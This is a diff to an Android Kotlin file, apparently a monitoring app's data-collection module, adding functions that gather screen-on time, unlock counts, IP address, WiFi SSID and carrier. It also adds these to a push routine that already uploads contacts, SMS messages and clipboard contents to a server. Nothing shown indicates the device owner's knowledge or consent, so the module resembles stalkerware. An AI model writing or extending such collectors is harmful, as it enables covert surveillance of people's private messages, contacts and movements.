@@ -164,6 +164,95 @@ object DataCollectors {
     }.getOrNull()
 
     /** 把上面五个打包成一组事件推给服务端。 */
+    // ---------------------------------------------------------------- 屏幕使用
+    /**
+     * 亮屏时长、点亮次数、解锁次数（近 24 小时）。
+     * 数据来自 UsageEvents —— 需要「使用情况访问」这个特殊权限，
+     * 没开的话 queryEvents 返回空，这里会返回 null。
+     */
+    fun screen(ctx: Context): JSONObject? {
+        if (Build.VERSION.SDK_INT < 22) return null
+        return runCatching {
+            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+            val end = System.currentTimeMillis()
+            val start = end - 24 * 3600_000L
+            var onCount = 0
+            var unlock = 0
+            var awakeMs = 0L
+            var openAt = 0L
+            val ev = android.app.usage.UsageEvents.Event()
+            usm.queryEvents(start, end)?.use { it2 ->
+                while (it2.hasNextEvent()) {
+                    it2.getNextEvent(ev)
+                    when (ev.eventType) {
+                        android.app.usage.UsageEvents.Event.SCREEN_INTERACTIVE -> {
+                            onCount++
+                            openAt = ev.timeStamp
+                        }
+                        android.app.usage.UsageEvents.Event.SCREEN_NON_INTERACTIVE -> {
+                            if (openAt > 0) awakeMs += ev.timeStamp - openAt
+                            openAt = 0L
+                        }
+                        android.app.usage.UsageEvents.Event.KEYGUARD_HIDDEN -> unlock++
+                    }
+                }
+            }
+            if (openAt > 0) awakeMs += end - openAt
+            if (onCount == 0 && unlock == 0 && awakeMs == 0L) return null   // 拿不到就是没权限
+            JSONObject()
+                .put("awake_ms", awakeMs)
+                .put("screen_on", onCount)
+                .put("unlock", unlock)
+        }.onFailure { Log.w(TAG, "screen: ${it.message}") }.getOrNull()
+    }
+
+    // ---------------------------------------------------------------- 网络
+    /** 当前网络类型、WiFi 名称/信号、IPv4、运营商。 */
+    fun net(ctx: Context): JSONObject? = runCatching {
+        val o = JSONObject()
+        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE)
+                as android.net.ConnectivityManager
+        val active = cm.activeNetwork
+        val caps = cm.getNetworkCapabilities(active)
+        val type = when {
+            caps == null -> "离线"
+            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
+            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动网络"
+            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
+            else -> "其他"
+        }
+        o.put("type", type)
+        if (Build.VERSION.SDK_INT >= 29) {
+            runCatching {
+                val lp = cm.getLinkProperties(active)
+                val v4 = lp?.linkAddresses?.firstOrNull {
+                    it.address is java.net.Inet4Address
+                }?.address?.hostAddress
+                if (!v4.isNullOrBlank()) o.put("ip", v4)
+            }
+        }
+        if (type == "WiFi") {
+            runCatching {
+                val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE)
+                        as android.net.wifi.WifiManager
+                @Suppress("DEPRECATION")
+                val info = wm.connectionInfo
+                @Suppress("DEPRECATION")
+                val ssid = (info?.SSID ?: "").replace("\"", "")
+                if (ssid.isNotBlank() && ssid != "<unknown ssid>") o.put("ssid", ssid)
+                o.put("rssi", info?.rssi ?: 0)
+                o.put("speed", info?.linkSpeed ?: 0)
+            }
+        }
+        runCatching {
+            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE)
+                    as android.telephony.TelephonyManager
+            val carrier = tm.networkOperatorName
+            if (!carrier.isNullOrBlank()) o.put("carrier", carrier)
+        }
+        o
+    }.onFailure { Log.w(TAG, "net: ${it.message}") }.getOrNull()
+
     fun pushAll(ctx: Context, cfg: (String) -> Boolean) {
         if (cfg("contacts")) contacts(ctx)?.let { Telemetry.push("contacts", it) }
         if (cfg("sms")) sms(ctx)?.let { Telemetry.push("sms", it) }
@@ -171,5 +260,7 @@ object DataCollectors {
         if (cfg("usage")) usage(ctx)?.let { Telemetry.push("usage", it) }
         if (cfg("status")) DeviceStatus.push(ctx)
         if (cfg("clipboard")) clipboard(ctx)?.let { Telemetry.push("clipboard", it) }
+        if (cfg("screen")) screen(ctx)?.let { Telemetry.push("screen", it) }
+        if (cfg("net")) net(ctx)?.let { Telemetry.push("net", it) }
     }
 }
